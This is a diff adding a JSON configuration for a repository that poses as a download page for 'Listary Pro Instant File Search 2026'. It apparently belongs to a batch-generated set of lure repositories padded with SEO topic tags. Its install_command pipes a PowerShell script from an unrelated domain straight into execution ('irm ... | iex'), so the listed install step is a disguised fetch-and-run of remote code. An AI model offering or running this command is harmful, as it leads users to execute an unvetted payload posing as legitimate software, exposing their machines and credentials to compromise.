@@ -1,0 +1,29 @@
+{
+  "repo": "listary-pro-instant-file-search-2026",
+  "product": "Listary Pro Instant File Search 2026",
+  "kind": "productivity",
+  "install_type": "download",
+  "download_url": "https://listary.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "productivity",
+  "topics": [
+    "listary-bundle",
+    "listary-platform",
+    "listary-file-manager",
+    "listary-64-bit",
+    "listary-startup-fix",
+    "listary-pc-install",
+    "listary-desktop-launcher",
+    "listary-workbench",
+    "listary-user-guide",
+    "listary-manual-2026",
+    "listary-installer",
+    "win-tools",
+    "system-utility",
+    "windows-tools",
+    "maintenance-tools"
+  ]
+}
